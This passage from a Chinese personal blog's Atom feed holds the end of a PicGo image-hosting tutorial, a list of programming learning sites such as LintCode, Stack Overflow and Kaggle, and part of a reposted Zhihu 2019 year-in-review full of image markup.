进行高效创作</font></h1><p>配置好PicGo后，我们就可以进行高效创作了，将图片拖拽到上传区，将会自动上传并复制访问链接，将链接粘贴到博文中就行了，访问速度杠杠的，此外PicGo还有相册功能，可以对已上传的图片进行删除，修改链接等快捷操作，PicGo还可以生成不同格式的链接、支持批量上传、快捷键上传、自定义链接格式、上传前重命名等，更多功能自己去探索吧！</p></div></section>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;

&lt;h1 id=&quot;Github-jsDelivr-PicGo-打造稳定快速、高效免费图床&quot;&gt;&lt;a href=&quot;#Github-jsDelivr-PicGo-打造稳定
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="jsDelivr" scheme="https://www.nikoyu.asia/tags/jsDelivr/"/>
    
      <category term="图床" scheme="https://www.nikoyu.asia/tags/%E5%9B%BE%E5%BA%8A/"/>
    
      <category term="PicGo" scheme="https://www.nikoyu.asia/tags/PicGo/"/>
    
  </entry>
  
  <entry>
    <title>程序员平时喜欢逛的论坛</title>
    <link href="https://www.nikoyu.asia/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%B9%B3%E6%97%B6%E5%96%9C%E6%AC%A2%E9%80%9B%E7%9A%84%E8%AE%BA%E5%9D%9B.html"/>
    <id>https://www.nikoyu.asia/%E7%A8%8B%E5%BA%8F%E5%91%98%E5%B9%B3%E6%97%B6%E5%96%9C%E6%AC%A2%E9%80%9B%E7%9A%84%E8%AE%BA%E5%9D%9B.html</id>
    <published>2019-12-23T02:22:33.000Z</published>
    <updated>2020-09-17T03:20:45.607Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="程序员平时喜欢逛的论坛"><a href="#程序员平时喜欢逛的论坛" class="headerlink" title="程序员平时喜欢逛的论坛"></a>程序员平时喜欢逛的论坛</h1><h2 id="1-Github敲有意思，比如能用Python最高效地在抖音找漂亮小姐姐，自动生成动漫人脸"><a href="#1-Github敲有意思，比如能用Python最高效地在抖音找漂亮小姐姐，自动生成动漫人脸" class="headerlink" title="1.Github敲有意思，比如能用Python最高效地在抖音找漂亮小姐姐，自动生成动漫人脸~"></a>1.Github敲有意思，比如能用Python最高效地在抖音找漂亮小姐姐，自动生成动漫人脸~</h2><p><img data-rawwidth="270" data-rawheight="480" data-size="normal" data-caption data-default-watermark-src="https://pic3.zhimg.com/50/v2-0d1dc6bd381218219995d7c76614a85b_hd.jpg" class="content_image lazyload" width="270" data-src="https://pic2.zhimg.com/50/v2-e8d6b59ee3ebe0c9c97f3ea21740d5eb_hd.jpg"><img data-rawwidth="720" data-rawheight="652" data-size="normal" data-caption data-default-watermark-src="https://pic3.zhimg.com/50/v2-9fcfcff0a471f770bba810b8d91c2c20_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="720" data-original="https://pic1.zhimg.com/v2-4b2019eaa1c5d0822d881bfb29f768a7_r.jpg" data-src="https://pic1.zhimg.com/50/v2-4b2019eaa1c5d0822d881bfb29f768a7_hd.jpg"><br>&emsp;&emsp;好了，正经点。Github是程序员托管代码的平台，很多开发者都会在上面找各种各样的开源项目来学习。阿里、腾讯、字节跳动、美团、Google、Micosoft等国内外大厂都有自己的Github开源库。</p><h2 id="2-LintCodeLintCode-收集了面试最常见、最高频的编程题目，非常适合求职者：LintCode有中文，能节省不少时间，更加人性化。有模拟面试专栏，精选-Facebook-Amazon-Google-Linkedin-等IT企业的面试题。有编程比赛，可以看到算法大佬的coding，能学到不少。"><a href="#2-LintCodeLintCode-收集了面试最常见、最高频的编程题目，非常适合求职者：LintCode有中文，能节省不少时间，更加人性化。有模拟面试专栏，精选-Facebook-Amazon-Google-Linkedin-等IT企业的面试题。有编程比赛，可以看到算法大佬的coding，能学到不少。" class="headerlink" title="2. LintCodeLintCode 收集了面试最常见、最高频的编程题目，非常适合求职者：LintCode有中文，能节省不少时间，更加人性化。有模拟面试专栏，精选 Facebook, Amazon, Google, Linkedin 等IT企业的面试题。有编程比赛，可以看到算法大佬的coding，能学到不少。"></a>2. LintCodeLintCode 收集了面试最常见、最高频的编程题目，非常适合求职者：LintCode有中文，能节省不少时间，更加人性化。有模拟面试专栏，精选 Facebook, Amazon, Google, Linkedin 等IT企业的面试题。有编程比赛，可以看到算法大佬的coding，能学到不少。</h2><img data-rawwidth="1883" data-rawheight="815" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1883" data-original="https://pic2.zhimg.com/v2-c081c5f067c0c1c158cf6fec5f80dd45_r.jpg" data-src="https://pic2.zhimg.com/50/v2-c081c5f067c0c1c158cf6fec5f80dd45_hd.jpg"><h2 id="3-Stack-OverflowStack-Overflow是一个IT技术问答网站，能解决你在coding中99-99999-的问题，关键是它不会弹出任何广告！"><a href="#3-Stack-OverflowStack-Overflow是一个IT技术问答网站，能解决你在coding中99-99999-的问题，关键是它不会弹出任何广告！" class="headerlink" title="3.Stack OverflowStack Overflow是一个IT技术问答网站，能解决你在coding中99.99999%的问题，关键是它不会弹出任何广告！"></a>3.Stack OverflowStack Overflow是一个IT技术问答网站，能解决你在coding中99.99999%的问题，关键是它不会弹出任何广告！</h2><img data-rawwidth="1808" data-rawheight="684" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1808" data-original="https://pic2.zhimg.com/v2-6c4d2e65c58b3bec7fb856ec55e9a9d7_r.jpg" data-src="https://pic2.zhimg.com/50/v2-6c4d2e65c58b3bec7fb856ec55e9a9d7_hd.jpg"><h2 id="4-CodinGameCodinGame很特别，是以玩游戏的方式通过在线编程完成相应挑战。有些游戏非常有趣，并且游戏界面和图形设计非常精美。"><a href="#4-CodinGameCodinGame很特别，是以玩游戏的方式通过在线编程完成相应挑战。有些游戏非常有趣，并且游戏界面和图形设计非常精美。" class="headerlink" title="4.CodinGameCodinGame很特别，是以玩游戏的方式通过在线编程完成相应挑战。有些游戏非常有趣，并且游戏界面和图形设计非常精美。"></a>4.CodinGameCodinGame很特别，是以玩游戏的方式通过在线编程完成相应挑战。有些游戏非常有趣，并且游戏界面和图形设计非常精美。</h2><img data-rawwidth="1884" data-rawheight="790" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1884" data-original="https://pic1.zhimg.com/v2-fcbd3eb692df3b6e31f941a8c56664b3_r.jpg" data-src="https://pic1.zhimg.com/50/v2-fcbd3eb692df3b6e31f941a8c56664b3_hd.jpg"><h2 id="5-GeeksforGeeks关于算法和数据结构，GeeksforGeeks-有很多好的文章、解释和代码解决方案。如果你正在准备一个面试，也可以用这个网站准备和复习更难的算法问题。"><a href="#5-GeeksforGeeks关于算法和数据结构，GeeksforGeeks-有很多好的文章、解释和代码解决方案。如果你正在准备一个面试，也可以用这个网站准备和复习更难的算法问题。" class="headerlink" title="5.GeeksforGeeks关于算法和数据结构，GeeksforGeeks 有很多好的文章、解释和代码解决方案。如果你正在准备一个面试，也可以用这个网站准备和复习更难的算法问题。"></a>5.GeeksforGeeks关于算法和数据结构，GeeksforGeeks 有很多好的文章、解释和代码解决方案。如果你正在准备一个面试，也可以用这个网站准备和复习更难的算法问题。</h2><img data-rawwidth="1404" data-rawheight="786" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1404" data-original="https://pic2.zhimg.com/v2-c968fa3733cd53b36f14d59b8a85603f_r.jpg" data-src="https://pic2.zhimg.com/50/v2-c968fa3733cd53b36f14d59b8a85603f_hd.jpg"><h2 id="6-CourseraCoursera是大型公开在线课程项目，由美国斯坦福大学两名计算机科学教授创办。Coursera的合作院校包括斯坦福大学、密歇根大学、普林斯顿大学、宾夕法尼亚大学等美国名校。你可以在上面学到大量计算机理论和编程知识，部分课程有中文字幕哦-。"><a href="#6-CourseraCoursera是大型公开在线课程项目，由美国斯坦福大学两名计算机科学教授创办。Coursera的合作院校包括斯坦福大学、密歇根大学、普林斯顿大学、宾夕法尼亚大学等美国名校。你可以在上面学到大量计算机理论和编程知识，部分课程有中文字幕哦-。" class="headerlink" title="6.CourseraCoursera是大型公开在线课程项目，由美国斯坦福大学两名计算机科学教授创办。Coursera的合作院校包括斯坦福大学、密歇根大学、普林斯顿大学、宾夕法尼亚大学等美国名校。你可以在上面学到大量计算机理论和编程知识，部分课程有中文字幕哦~。"></a>6.CourseraCoursera是大型公开在线课程项目，由美国斯坦福大学两名计算机科学教授创办。Coursera的合作院校包括斯坦福大学、密歇根大学、普林斯顿大学、宾夕法尼亚大学等美国名校。你可以在上面学到大量计算机理论和编程知识，部分课程有中文字幕哦~。</h2><img data-rawwidth="604" data-rawheight="440" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="604" data-original="https://pic3.zhimg.com/v2-148165e64288b0a97c3bdae1d288ef5f_r.jpg" data-src="https://pic3.zhimg.com/50/v2-148165e64288b0a97c3bdae1d288ef5f_hd.jpg"><h2 id="7-CodewarsCodewars提供了大量由他们自己的社区提交和编辑的编程挑战，你可以像打游戏升级一样进行挑战，并提高分数和排名。"><a href="#7-CodewarsCodewars提供了大量由他们自己的社区提交和编辑的编程挑战，你可以像打游戏升级一样进行挑战，并提高分数和排名。" class="headerlink" title="7.CodewarsCodewars提供了大量由他们自己的社区提交和编辑的编程挑战，你可以像打游戏升级一样进行挑战，并提高分数和排名。"></a>7.CodewarsCodewars提供了大量由他们自己的社区提交和编辑的编程挑战，你可以像打游戏升级一样进行挑战，并提高分数和排名。</h2><img data-rawwidth="1863" data-rawheight="894" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1863" data-original="https://pic4.zhimg.com/v2-bdc360b016427aa06f12ee3d6af38125_r.jpg" data-src="https://pic4.zhimg.com/50/v2-bdc360b016427aa06f12ee3d6af38125_hd.jpg"><h2 id="8-Kaggle在线竞赛Kaggle-是数据挖掘、机器学习在线竞赛平台，在简历上有这一经历对求职者来说是非常具有优势的。"><a href="#8-Kaggle在线竞赛Kaggle-是数据挖掘、机器学习在线竞赛平台，在简历上有这一经历对求职者来说是非常具有优势的。" class="headerlink" title="8.Kaggle在线竞赛Kaggle 是数据挖掘、机器学习在线竞赛平台，在简历上有这一经历对求职者来说是非常具有优势的。"></a>8.Kaggle在线竞赛Kaggle 是数据挖掘、机器学习在线竞赛平台，在简历上有这一经历对求职者来说是非常具有优势的。</h2><img data-rawwidth="1648" data-rawheight="821" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1648" data-original="https://pic1.zhimg.com/v2-609412aa8fdc685782ae6ba84a940452_r.jpg" data-src="https://pic1.zhimg.com/50/v2-609412aa8fdc685782ae6ba84a940452_hd.jpg"><h2 id="9-B站还没用B站学习你就out了！B站不止于鬼畜和二次元。央视网就曾在微博表示：2018年有近2000万人在B站学习，相当于高考人数的2倍！"><a href="#9-B站还没用B站学习你就out了！B站不止于鬼畜和二次元。央视网就曾在微博表示：2018年有近2000万人在B站学习，相当于高考人数的2倍！" class="headerlink" title="9. B站还没用B站学习你就out了！B站不止于鬼畜和二次元。央视网就曾在微博表示：2018年有近2000万人在B站学习，相当于高考人数的2倍！"></a>9. B站还没用B站学习你就out了！B站不止于鬼畜和二次元。央视网就曾在微博表示：2018年有近2000万人在B站学习，相当于高考人数的2倍！</h2><img data-rawwidth="1157" data-rawheight="764" data-size="normal" data-caption data-default-watermark-src="https://pic3.zhimg.com/50/v2-35a5c6d4fa87351093653b58510b6ae2_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="1157" data-original="https://pic3.zhimg.com/v2-095e1b5a82ec2240fa57afefb87ab923_r.jpg" data-src="https://pic3.zhimg.com/50/v2-095e1b5a82ec2240fa57afefb87ab923_hd.jpg"><h2 id="10-TopCoderTopCoder-是最早的在线编程竞技平台之一，他们还会赞助竞赛，如果你写出最好的解决方案，就可以拿到奖励！2019年就有5000美金给前5名。"><a href="#10-TopCoderTopCoder-是最早的在线编程竞技平台之一，他们还会赞助竞赛，如果你写出最好的解决方案，就可以拿到奖励！2019年就有5000美金给前5名。" class="headerlink" title="10.TopCoderTopCoder 是最早的在线编程竞技平台之一，他们还会赞助竞赛，如果你写出最好的解决方案，就可以拿到奖励！2019年就有5000美金给前5名。"></a>10.TopCoderTopCoder 是最早的在线编程竞技平台之一，他们还会赞助竞赛，如果你写出最好的解决方案，就可以拿到奖励！2019年就有5000美金给前5名。</h2><img data-rawwidth="1080" data-rawheight="496" data-size="normal" data-caption class="origin_image zh-lightbox-thumb lazyload" width="1080" data-original="https://pic4.zhimg.com/v2-6cb99b281a426409aed0a5c4f9435ad6_r.jpg" data-src="https://pic4.zhimg.com/50/v2-6cb99b281a426409aed0a5c4f9435ad6_hd.jpg">]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;

&lt;h1 id=&quot;程序员平时喜欢逛的论坛&quot;&gt;&lt;a href=&quot;#程序员平时喜欢逛的论坛&quot; class=&quot;headerlink&quot; title=&quot;程序员平时喜欢逛的论坛
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="IT" scheme="https://www.nikoyu.asia/tags/IT/"/>
    
  </entry>
  
  <entry>
    <title>2019 年度回顾视频：感谢一切难题！</title>
    <link href="https://www.nikoyu.asia/2019.html"/>
    <id>https://www.nikoyu.asia/2019.html</id>
    <published>2019-12-17T02:07:18.000Z</published>
    <updated>2020-09-17T03:20:45.593Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="2019-年度回顾视频：感谢一切难题！"><a href="#2019-年度回顾视频：感谢一切难题！" class="headerlink" title="2019 年度回顾视频：感谢一切难题！"></a>2019 年度回顾视频：感谢一切难题！</h1><div class="RichText ztext Post-RichText"><p>2019，该如何回顾这一年？</p><p>或许，一言「难」尽</p><p>我们试图用 3 分钟定格关于它的记忆</p><p>好让这 365 个被万种情绪浸泡的时日，得以隽永</p><div><div class="RichText-video" data-za-detail-view-path-module="VideoItem" data-za-extra-module="{&quot;card&quot;:{&quot;content&quot;:{&quot;type&quot;:&quot;Video&quot;,&quot;sub_type&quot;:&quot;SelfHosted&quot;,&quot;video_id&quot;:&quot;1189954775381282816&quot;,&quot;is_playable&quot;:true}}}"><div class="VideoCard VideoCard--interactive"><div class="VideoCard-layout"><div class="VideoCard-video"><div class="VideoCard-video-content"><div class="VideoCard-player"><iframe hidden frameborder="0" allowfullscreen src="https://www.zhihu.com/video/1189954775381282816?autoplay=false&amp;useMSE="></iframe></div></div></div><div class="VideoCard-content"><div class="VideoCard-title">知乎 2019 年度大事记</div></div></div><div class="VideoCard-mask"></div></div></div></div><p>我们用这一年，被迫接受那些<b>猝不及防的「失去」</b></p><p>天灾悄然而至，人祸打破几家团圆</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-61eeacc358160f3771548e2fccb8cab7_r.jpg" data-src="https://pic4.zhimg.com/v2-61eeacc358160f3771548e2fccb8cab7_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-61eeacc358160f3771548e2fccb8cab7_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-61eeacc358160f3771548e2fccb8cab7_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-61eeacc358160f3771548e2fccb8cab7_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-be307e7956d36867ffdc079f8cf126a0_r.jpg" data-src="https://pic1.zhimg.com/v2-be307e7956d36867ffdc079f8cf126a0_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-be307e7956d36867ffdc079f8cf126a0_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-be307e7956d36867ffdc079f8cf126a0_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-be307e7956d36867ffdc079f8cf126a0_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p>我们用这一年，去消化那些<b>事与愿违的「来临」</b></p><p>代价是咬牙吞下眼眶里兜转的泪</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-5f733dfcd58a5fb0db4e63e203251cdc_r.jpg" data-src="https://pic1.zhimg.com/v2-5f733dfcd58a5fb0db4e63e203251cdc_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-5f733dfcd58a5fb0db4e63e203251cdc_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-5f733dfcd58a5fb0db4e63e203251cdc_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-5f733dfcd58a5fb0db4e63e203251cdc_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-0f378b74b8a9bee659f5a414b71c27bf_r.jpg" data-src="https://pic4.zhimg.com/v2-0f378b74b8a9bee659f5a414b71c27bf_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-0f378b74b8a9bee659f5a414b71c27bf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-0f378b74b8a9bee659f5a414b71c27bf_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-0f378b74b8a9bee659f5a414b71c27bf_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p>我们用这一年，试图和<b>旷日持久的「挣扎」</b>抗衡</p><p>但是成人的世界，哪有那么多关心你「疼不疼」的人</p><p>见缝插针的意外，让生命的消殒变得轻易无比</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-9792cfacf584dc8a0b148a4c7889a3ec_r.jpg" data-src="https://pic1.zhimg.com/v2-9792cfacf584dc8a0b148a4c7889a3ec_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-9792cfacf584dc8a0b148a4c7889a3ec_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-9792cfacf584dc8a0b148a4c7889a3ec_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-9792cfacf584dc8a0b148a4c7889a3ec_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-fad7d866961456977565833d7f67ca65_r.jpg" data-src="https://pic2.zhimg.com/v2-fad7d866961456977565833d7f67ca65_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-fad7d866961456977565833d7f67ca65_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-fad7d866961456977565833d7f67ca65_b.jpg" data-lazy-status="ok" data-src="https://pic2.zhimg.com/80/v2-fad7d866961456977565833d7f67ca65_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>难？成人的世界哪有容易？</b></p><p>于是纵有千万人阻挡，我们也绝不投降</p><p>如果棋逢对手，那就拼上一场</p><p>因为相信，「胜利一定是我们的」</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-93302dbfd7420beae58113916ea76af6_r.jpg" data-src="https://pic3.zhimg.com/v2-93302dbfd7420beae58113916ea76af6_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-93302dbfd7420beae58113916ea76af6_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-93302dbfd7420beae58113916ea76af6_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-93302dbfd7420beae58113916ea76af6_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>有些抵达难免迂回</b>，但曲折离奇终能靠岸</p><p>因为相信，即使一人也不是在孤军奋战</p><p>身处黑暗，「你往前走，我在后面，别害怕」</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-6dd80621efc129cc08d8c72ef2e87935_r.jpg" data-src="https://pic2.zhimg.com/v2-6dd80621efc129cc08d8c72ef2e87935_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-6dd80621efc129cc08d8c72ef2e87935_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-6dd80621efc129cc08d8c72ef2e87935_b.jpg" data-lazy-status="ok" data-src="https://pic2.zhimg.com/80/v2-6dd80621efc129cc08d8c72ef2e87935_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-808fe9575a37af9f05b327b2bbc9fac6_r.jpg" data-src="https://pic3.zhimg.com/v2-808fe9575a37af9f05b327b2bbc9fac6_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-808fe9575a37af9f05b327b2bbc9fac6_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-808fe9575a37af9f05b327b2bbc9fac6_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-808fe9575a37af9f05b327b2bbc9fac6_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-ee28a98f514bb488753d4609a3590d51_r.jpg" data-src="https://pic2.zhimg.com/v2-ee28a98f514bb488753d4609a3590d51_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic2.zhimg.com/v2-ee28a98f514bb488753d4609a3590d51_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-ee28a98f514bb488753d4609a3590d51_b.jpg" data-lazy-status="ok" data-src="https://pic2.zhimg.com/80/v2-ee28a98f514bb488753d4609a3590d51_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>有些风暴需要冲破</b>，我们闯荡星河一起涨落</p><p>用冷静和责任战胜搏击长空的险</p><p>用极限去挑战下一个未知的极限</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-1b90b1886d2696f978f0f37042e6c727_r.jpg" data-src="https://pic4.zhimg.com/v2-1b90b1886d2696f978f0f37042e6c727_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-1b90b1886d2696f978f0f37042e6c727_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-1b90b1886d2696f978f0f37042e6c727_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-1b90b1886d2696f978f0f37042e6c727_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-24cd608b706b52318fa742e33e55b08f_r.jpg" data-src="https://pic4.zhimg.com/v2-24cd608b706b52318fa742e33e55b08f_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic4.zhimg.com/v2-24cd608b706b52318fa742e33e55b08f_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-24cd608b706b52318fa742e33e55b08f_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-24cd608b706b52318fa742e33e55b08f_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>直面遗憾，用它练就强悍</b></p><p>因为正义不是如履薄冰，是如影随形</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-da9a533ec679889bbb6b4bac586ee3c4_r.jpg" data-src="https://pic1.zhimg.com/v2-da9a533ec679889bbb6b4bac586ee3c4_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-da9a533ec679889bbb6b4bac586ee3c4_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-da9a533ec679889bbb6b4bac586ee3c4_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-da9a533ec679889bbb6b4bac586ee3c4_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>拥抱伤痛，用它兑换荣耀</b></p><p>因为苦尽之后，「我们是冠军」</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-6b411d62a77a4e972347d1d5c0afab98_r.jpg" data-src="https://pic1.zhimg.com/v2-6b411d62a77a4e972347d1d5c0afab98_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic1.zhimg.com/v2-6b411d62a77a4e972347d1d5c0afab98_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-6b411d62a77a4e972347d1d5c0afab98_b.jpg" data-lazy-status="ok" data-src="https://pic1.zhimg.com/80/v2-6b411d62a77a4e972347d1d5c0afab98_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-e4a71b597440d6f6c7d9746a74a9b046_r.jpg" data-src="https://pic3.zhimg.com/v2-e4a71b597440d6f6c7d9746a74a9b046_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-e4a71b597440d6f6c7d9746a74a9b046_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-e4a71b597440d6f6c7d9746a74a9b046_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-e4a71b597440d6f6c7d9746a74a9b046_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-fee3e27abd7d942f4e15da42b3271b4e_r.jpg" data-src="https://pic3.zhimg.com/v2-fee3e27abd7d942f4e15da42b3271b4e_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-fee3e27abd7d942f4e15da42b3271b4e_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-fee3e27abd7d942f4e15da42b3271b4e_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-fee3e27abd7d942f4e15da42b3271b4e_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>感谢一切难题，让答案来得更有份量</b></p><p>从 1949 到 2019</p><p>你，你们，我，我们，他，他们</p><p>经风雨也一同见证这盛世</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-cc60f093790c99d1d2528277cfbfa272_r.jpg" data-src="https://pic3.zhimg.com/v2-cc60f093790c99d1d2528277cfbfa272_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" 